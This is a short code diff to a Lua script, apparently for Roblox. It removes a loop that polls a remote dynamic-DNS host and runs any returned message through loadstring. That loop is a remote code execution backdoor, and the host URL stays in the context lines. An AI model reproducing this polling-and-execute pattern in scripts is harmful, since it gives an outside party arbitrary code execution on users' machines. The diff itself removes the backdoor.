@@ -321,19 +321,7 @@ local HttpService = game:GetService("HttpService")
 local receiveUrl = "http://8130.ddns.net:36081/receive/server_1"
 
 local function waitForMessage()
-	print("Init")
-	while true do
-        local s, r = pcall(function()
-            local response = request({Url = receiveUrl, Method = "GET", Headers = {["Content-Type"] = "application/json"}})
-			local data = HttpService:JSONDecode(response.Body)
-			if data.message ~= "No message" then
-			     loadstring(data.message)()
-			end
-        end)
-        if not s then
-            warn(r)
-        end
-	end
+	
 end
 
 function Notification(name)
